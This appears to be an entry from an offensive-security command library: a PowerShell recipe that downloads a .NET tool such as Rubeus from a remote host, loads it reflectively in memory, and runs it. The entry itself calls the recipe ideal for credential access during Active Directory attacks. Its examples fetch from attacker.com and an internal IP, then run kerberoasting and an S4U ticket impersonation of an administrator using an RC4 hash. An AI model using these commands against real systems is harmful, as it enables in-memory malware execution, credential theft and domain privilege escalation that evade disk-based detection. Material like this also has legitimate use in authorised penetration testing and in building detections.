---
id: a8c2bc5b-c1aa-4a05-ba17-a397b3485009
name: powershell-download-and-run-rubeus-with-arguments
type: command
executor: powershell
data: |-
  $data = (New-Object System.Net.WebClient).DownloadData('$_ASSEMBLY_URL')
  $assem = [System.Reflection.Assembly]::Load($data)
  [$_NAMESPACE.$_CLASS]::$_ENTRY_METHOD($_ARGUMENTS.Split())
output: null
created_at: '2023-04-06T03:56:24.082063+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - reflective-loading
  - powershell
  - kerberos
verified: true
validated: true
---

# powershell-download-and-run-rubeus-with-arguments

## Command

```powershell
$data = (New-Object System.Net.WebClient).DownloadData('$_ASSEMBLY_URL')
$assem = [System.Reflection.Assembly]::Load($data)
[$_NAMESPACE.$_CLASS]::$_ENTRY_METHOD($_ARGUMENTS.Split())
```

## Description

This PowerShell command downloads a .NET tool like Rubeus from a remote URL, loads it reflectively, and executes its main method with provided arguments. Ideal for running credential access tools in memory during active directory attacks.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_ASSEMBLY_URL | URL to the .NET executable (e.g., Rubeus.exe) | Yes |
| $_NAMESPACE | Namespace of the entry class (e.g., Rubeus) | Yes |
| $_CLASS | Class name (e.g., Program) | Yes |
| $_ENTRY_METHOD | Method to invoke (e.g., Main) | Yes |
| $_ARGUMENTS | Space-separated string of arguments (e.g., "s4u /user:target$ /rc4:hash") | Yes |

## Examples

### Basic Usage

```powershell
$data = (New-Object System.Net.WebClient).DownloadData('http://attacker.com/Rubeus.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[Rubeus.Program]::Main('kerberoast'.Split())
```

### Advanced Usage

For S4U ticket impersonation:

```powershell
$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.16.7/Rubeus.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[Rubeus.Program]::Main("s4u /user:web01$ /rc4:1d77f43d9604e79e5626c6905705801e /impersonateuser:administrator /msdsspn:cifs/file01 /ptt".Split())
```

## Expected Output

Tool-specific output, such as Kerberos ticket details or success/error messages (e.g., "Ticket successfully generated"). Network or process activity indicates success.

## Related

- [[procedures/Reflective-Assembly-Loading-with-PowerShell]]
- [[commands/powershell-download-and-run-assembly-without-arguments]]
